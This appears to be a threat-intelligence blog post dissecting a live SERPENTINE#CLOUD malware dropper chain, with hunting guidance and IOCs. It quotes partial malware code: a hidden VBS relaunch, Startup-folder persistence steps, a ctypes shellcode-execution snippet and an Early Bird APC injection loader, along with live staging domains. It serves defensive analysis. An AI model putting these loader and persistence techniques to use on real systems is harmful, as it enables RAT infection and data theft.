---
title: "Ph-Tagged, Tunnel-Hopping, and APC-Injecting: Inside the SERPENTINE#CLOUD Dropper Chain"
description: "A WsgiDAV opendir tip from @smica83 leads to a live SERPENTINE#CLOUD staging server on a Cloudflare Tunnel. Three BAT files, two delivery paths, four Python runtimes, an Early Bird APC DLL, and a naming convention that traces the campaign back to December 2022."
pubDate: "2026-07-04T12:00:00"
permalink: "/2026/07/04/serpentine-cloud-cloudflare-tunnel-asyncrat/"
tags: ["serpentine-cloud", "asyncrat", "trycloudflare", "wsgidav", "opendir", "python", "bat-dropper", "apc-injection", "early-bird", "cloudflare-tunnel", "threat-intel", "infostealer"]
thumb: "/images/serpentine-cloud-cloudflare-tunnel-asyncrat-thumb.svg"
---

[@smica83](https://x.com/smica83) posted another WsgiDAV opendir. Same tag — `#WsgiDAV #opendir` — same hunting ground, different server. The subdomain this time: `classification-timeline-karl-collectors.trycloudflare.com`. Still anonymous read-write, WsgiDAV 4.3.4, timestamp in UTC.

Three files. One batch script, two text files that are also batch scripts. All of them download Python runtimes from a second Cloudflare Tunnel, execute shellcode-loading Python payloads, scrub the staging directory, and vanish. The staging folder is named `Reggtones`. The startup persistence file used to be hardcoded as `PhDec22SU.bat`. The `Ph` prefix is on everything.

This is SERPENTINE#CLOUD — a Python-plus-Cloudflare dropper campaign Securonix first named in late 2024. What makes this server worth writing up is the snapshot it gives of how the campaign has evolved: two delivery paths running in parallel, a DLL side-loading arm that didn't appear in earlier public write-ups, and enough build artefacts across four payload generations to date the operator back to at least December 2022.

Everything here was done passively. No credentials tested, no C2 contacted.

---

## What Was on the Server

The delivery server (`classification-timeline-karl-collectors.trycloudflare.com`) held three files when retrieved:

```
74gfbsfgsdgsh.bat    4,642 bytes    2026-07-02 14:55 UTC
PhJun171.txt         2,278 bytes    2026-06-17 10:24 UTC
PhJun172.txt         3,010 bytes    2026-06-17 09:50 UTC
```

`74gfbsfgsdgsh.bat` is the current-generation dropper — written yesterday. The two `.txt` files are an older two-stage variant from mid-June, uploaded here as reference or backup. All three are Windows batch scripts with a UTF-16 BOM (`FF FE`) followed by a `cls` call, the operator's consistent formatting fingerprint across every file in this campaign.

The secondary staging server — `dollar-jury-outsourcing-vocational.trycloudflare.com` — is where the actual payloads live:

```
PhJuly02DLL.zip         762,587 bytes    2026-06-09 02:05 UTC
PhJuly02MA.tar       17,566,960 bytes    2026-07-02 14:48 UTC   ← yesterday
PhJuly02ST.tar       17,341,926 bytes    2026-07-02 14:49 UTC   ← yesterday
PhJuly02SU.bat            1,905 bytes    2026-06-09 02:05 UTC
PhJuly02SU.txt            2,761 bytes    2026-06-09 02:05 UTC
PHSep01x86_Ayoo.zip  10,652,571 bytes    2026-06-09 02:05 UTC
```

The two `.tar` files were staged yesterday, concurrent with the new dropper. The rest — the DLL package, startup script, and `_Ayoo` archive — were pre-staged on June 9.

---

## The `Ph` Naming Convention

Before digging into the scripts, the filenames are worth pausing on. Every file is tagged with `Ph` followed by a date:

| File | Date in name | Upload/modified |
|---|---|---|
| `PhDec22SU.bat` (hardcoded startup path) | Dec 2022 | — |
| `PHSep01x86_Ayoo.zip` | Sep 1 | Jun 9 2026 |
| `PhApr23MA.zip`, `PhApr23ST.zip`, `PhApr23SU.txt` | Apr 23 | referenced in Jun 17 scripts |
| `PhJun171.txt`, `PhJun172.txt` | Jun 17 | Jun 17 2026 |
| `PhJuly02MA.tar`, `PhJuly02ST.tar`, `PhJuly02SU.bat/txt` | Jul 2 | Jul 2 / Jun 9 2026 |

`Ph` is likely shorthand for "Phishing" or a campaign identifier. The date suffix marks each build generation. The suffix types — `MA` (main archive), `ST` (secondary/str), `SU` (startup) — are consistent across generations. The hardcoded `PhDec22SU.bat` startup path in the June 17 scripts suggests the campaign infrastructure was built out in December 2022, and this naming convention has survived every subsequent build.

---

## Stage 1: The Dropper (74gfbsfgsdgsh.bat)

The July 2 dropper is a 4,642-byte batch script. It does five things in sequence:

**1. Hidden relaunch via VBScript.** On first run, it writes a temporary VBS shim that re-executes the batch with `WindowStyle = 0` (invisible), then deletes the shim:

```batch
echo Set s=CreateObject("WScript.Shell")
echo s.Run Chr(34) & "%~f0" & Chr(34) & " hidden", 0, False
> "%USERPROFILE%\Contacts\rhn.vbs"
wscript "%USERPROFILE%\Contacts\rhn.vbs"
```

**2. PDF decoy.** New in this build: the script enumerates PDFs in the victim's Downloads and Documents folders, picks one at random, and opens it with `start ""`. The victim sees a legitimate file open while everything else runs in the background.

```batch
(for /r "%USERPROFILE%\Downloads" %%f in (*.pdf) do echo %%f
 for /r "%USERPROFILE%\Documents" %%f in (*.pdf) do echo %%f) > "%pdfListFile%"
set /a rand=!random! %% %count%
```

**3. Download.** Three files are pulled from the staging server:

```
PhJuly02MA.tar  → %USERPROFILE%\Contacts\docuts\64<RAND>.tar
PhJuly02ST.tar  → %USERPROFILE%\Contacts\docuts\<RAND>.tar
PhJuly02SU.txt  → %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\<RAND>.bat
```

The startup BAT drops directly into the user's Startup folder with a randomised five-character alphanumeric name. The `.txt` extension in the download URL masks the BAT content from web filters.

**4. Extract and execute.** Both archives are extracted using the Windows-native `tar` binary. The main archive (`MA`) goes to `%USERPROFILE%\Contacts\Reggtones\`, the secondary (`ST`) to `%USERPROFILE%\Contacts\str\`. Python scripts from `Reggtones\Python312x64\` then launch with random 2–8 second delays between each:

```batch
for %%f in ("%EXTRACTTO%\Python312x64\*.py") do (
    start "" /b "%PYTHONW%" "%%f"
    set /a "DELAY=!RANDOM! %% 7 + 2"
    timeout /t !DELAY! /nobreak >nul
)
```

**5. Cleanup.** Python processes are killed via a WMI VBS query, staging directories deleted, surviving folders hidden with `attrib +h`, all BAT files in the Contacts folder purged.

---

## The Older Two-Stage Variant (PhJun171 + PhJun172)

The June 17 pair shows how the dropper looked one generation earlier:

- `PhJun171.txt` is a standalone downloader. It fetches from `varying-often-cute-employment.trycloudflare.com` (now offline): `PhApr23MA.zip`, `PhApr23ST.zip`, and `PhApr23SU.txt`. The staging folder was `MainRingtones` instead of the current `Reggtones`. The archives were ZIPs rather than TARs.
- `PhJun172.txt` is the executor and cleanup stage, run separately. It executes all `.py` files from `MainRingtones\Python312x64\`, then runs a VBS script to kill the Python parent process, hides the staging dirs, and deletes the startup BAT. Crucially, it references a **hardcoded** startup path: `%APPDATA%\...\Startup\PhDec22SU.bat`. The July build randomises this name — the hardcoded variant is a cleaner IOC for retrospective hunting.

Between April and July, the operator:
- Merged the two-file staged approach into a single combined script
- Switched from ZIP to TAR compression
- Renamed `MainRingtones` to `Reggtones`
- Added the PDF decoy
- Randomised the startup BAT name

---

## The Startup BAT and Four Python Environments

`PhJuly02SU.txt` (the version placed in the Startup folder) is more complex than the simple `.bat` variant. It orchestrates four Python execution paths:

```batch
:: 1. 32-bit (Winic) - Mode 2
call :LaunchAndClean "%APPDATA%\Winic\30.3.0rc50\Python312x32" "python.exe" 2

:: 2. 64-bit (Contacts\Str)
call :LaunchAndClean "%USERPROFILE%\Contacts\Str\python312x64" "python.exe" 1

:: 3. 64-bit variant (x644)
call :LaunchAndClean "%USERPROFILE%\Contacts\Str\python312x644" "python.exe" 1

:: 4. Same x644 path again
call :LaunchAndClean "%USERPROFILE%\Contacts\Str\python312x644" "python.exe" 1
```

`%APPDATA%\Winic\30.3.0rc50\` impersonates a legitimate application install path. `Winic` is a Wi-Fi management tool; the version string `30.3.0rc50` is plausible enough to pass a casual glance. The 32-bit path runs in **Mode 2**, which additionally kills Python processes that spawned `nslookup.exe` — one payload appears to use DNS for C2 beaconing or a DNS-based data channel.

The WMI VBS helper written by the startup script is named `DiscordDial.vbs` — either deliberate misdirection or the C2 channel involves Discord webhooks.

```batch
) > "%USERPROFILE%\Contacts\DiscordDial.vbs"
cscript //nologo "%USERPROFILE%\Contacts\DiscordDial.vbs" "explorer.exe" "python.exe"
```

---

## The Python Payload

`PHSep01x86_Ayoo.zip` contains a complete Python 3.12 x86 runtime (33 files) and a single payload script: `2Sep03jsgddhs_hv.py`. The script is obfuscated in two layers:

**Layer 1:** The entire decoded source is stored as a hex-escaped string (`\x69\x6d\x70\x6f\x72\x74...`) in a triple-quoted variable, executed at runtime.

**Layer 2:** Inside the decoded source, a 353,634-byte blob is stored as a base64 string and decoded at runtime. The first bytes (`1686b405...`) show no recognisable magic — the blob is encrypted.

The execution chain once decrypted:

```python
import ctypes
# ... [obfuscated decryption of shellcode blob] ...
ctypes.windll.kernel32.VirtualProtect(ctypes.byref(shellcode_ptr), ...)
ctypes.cast(shellcode_ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))()
```

`VirtualProtect` marks the decrypted memory executable, then the shellcode runs directly via a `CFUNCTYPE` cast. Textbook SERPENTINE#CLOUD Python shellcode loader behaviour — the final payload is AsyncRAT, VenomRAT, or XWorm injected into a host process.

---

## The DLL Side-Loading Path

`PhJuly02DLL.zip` is a second delivery mechanism that didn't appear in earlier public reporting on this campaign. It contains three files:

```
gngfmhHv.dll    PE32+ x64 DLL (stripped, 10 sections)
dbfca.dat       755,916 bytes, fully encrypted
init.cmd        regsvr32 /s "%~dp0gngfmh.dll"
```

`gngfmhHv.dll` exports a `DllRegisterServer` entry point (the target of `regsvr32`). The string `inject_early_bird` is present in plaintext — this is an Early Bird APC injection loader. `regsvr32` triggers `DllRegisterServer`, which loads `dbfca.dat`, decrypts it, allocates RWX memory, and queues the shellcode into a newly created process via `QueueUserAPC` before the main thread starts, bypassing user-mode hooks that would fire on `CreateRemoteThread`.

`dbfca.dat` has no magic bytes; the key material is embedded in the DLL. This path requires the attacker to separately deliver and execute `init.cmd`, likely via the Python stage or a separate phishing step.

---

## Infrastructure

The campaign runs entirely through ephemeral Cloudflare Tunnel subdomains. There's no persistent IP to pivot on:

| Domain | Role | Status |
|---|---|---|
| `classification-timeline-karl-collectors.trycloudflare.com` | Delivery (current) | Live |
| `dollar-jury-outsourcing-vocational.trycloudflare.com` | Payload staging (current) | Live |
| `varying-often-cute-employment.trycloudflare.com` | Payload staging (Jun 17) | Offline |

Each tunnel is a Cloudflare-fronted TCP proxy to the operator's localhost. Blocking the subdomain works exactly once — the next run uses a new random subdomain. The anonymous read-write WsgiDAV configuration means any machine can upload new payloads without authentication.

---

## SERPENTINE#CLOUD Attribution

Every indicator here aligns with the SERPENTINE#CLOUD cluster documented by Securonix and Forcepoint:

- WsgiDAV staging on Cloudflare Tunnel subdomains
- Bundled Python 3.12 runtime (no dependency on the victim's Python install)
- Staging in `%USERPROFILE%\Contacts\` with "Ringtones"-variant subfolder names
- Startup folder BAT persistence
- `ctypes.VirtualProtect` + function-pointer shellcode execution
- Python parent process killed via WMI after execution
- Early Bird APC injection for final payload delivery
- AsyncRAT / VenomRAT / XWorm final stage family

The `Ph` prefix and date-stamped build naming aren't in prior public reporting. The DLL side-loading path and `Winic` installation masquerade are also new additions since the Forcepoint and Securonix write-ups from late 2024 / early 2025.

The `_Ayoo` suffix on `PHSep01x86_Ayoo.zip` is unresolved — likely a target identifier, affiliate tag, or victim batch label.

---

## What To Hunt For

**Filesystem:**
- `%USERPROFILE%\Contacts\Reggtones\` or `MainRingtones\` — hidden Python runtime
- `%USERPROFILE%\Contacts\str\` — secondary hidden payload directory
- `%APPDATA%\Winic\30.3.0rc50\Python312x32\` — masqueraded 32-bit runtime
- `%USERPROFILE%\Contacts\DiscordDial.vbs` — WMI parent killer (transient)
- `%USERPROFILE%\Contacts\rhn.vbs` or `rhnE.vbs` — hidden-relaunch shim (transient)
- `%APPDATA%\...\Startup\PhDec22SU.bat` — hardcoded IOC in older builds
- Any `Ph*.bat` in Startup folder

**Process:**
- `wscript.exe` spawning `cmd.exe` with `hidden` argument
- `python.exe` child of `explorer.exe` with no visible window
- `cscript.exe` executing WMI queries to kill `python.exe`
- `regsvr32.exe /s` loading a DLL from `%USERPROFILE%\Contacts\`

**Network:**
- Outbound to `*.trycloudflare.com` from `curl.exe` or Python
- DNS queries to `*.trycloudflare.com` from `python.exe`
- Possible nslookup-based beacon: `nslookup.exe` child of `python.exe`

---

## IOCs

**Delivery server (live):**
`classification-timeline-karl-collectors.trycloudflare.com`

**Payload staging server (live):**
`dollar-jury-outsourcing-vocational.trycloudflare.com`

**Offline:**
`varying-often-cute-employment.trycloudflare.com`

**Hashes (SHA-256):**

| File | SHA-256 |
|---|---|
| `74gfbsfgsdgsh.bat` | `671e79569df063d793b2ba7fdee1fdb996b3012b748abec980cea60de15ab678` |
| `PhJun171.txt` | `492fe604a1bd7d9ab107ccfb26a1adc384bae151f14a24ba3f2ba102ef380510` |
| `PhJun172.txt` | `c978e8310f179fc5a3a3275a81d57ed8e95705f00b24d205dff705502e942f41` |
| `PhJuly02SU.bat` | `832326f3a377973a35cb465bd3510f5f6199c7454a0e0557e4f95b85313a76a5` |
| `PhJuly02SU.txt` | `9d879a24e8e8206114f579e5ef89766c84cea43798b7a3c9fb0b56e3f2944736` |
| `PhJuly02DLL.zip` | `75d32d4b2fc9960be82c67845782848bf4a1df8e0f3442129f7ce5a4580f640e` |
| `PHSep01x86_Ayoo.zip` | `06c9d67ad7d9d11e12b2f167cc22e1ea538df4b28f85fc6e00c36e9bcdaec043` |
| `gngfmhHv.dll` | `419f1c708cb2901f3bad3533404de6e58c5d4aca6eddeb65ccd1314ed85f9f43` |
| `dbfca.dat` | `a0c81fa325589bdb72a3ebd4ed5b69864915a81522cebfa2a2b688323adf5d19` |
| `2Sep03jsgddhs_hv.py` | `96e157a49e9b3667d9c0838743a5cff48803e7062357853d2cd3f430c05c181c` |
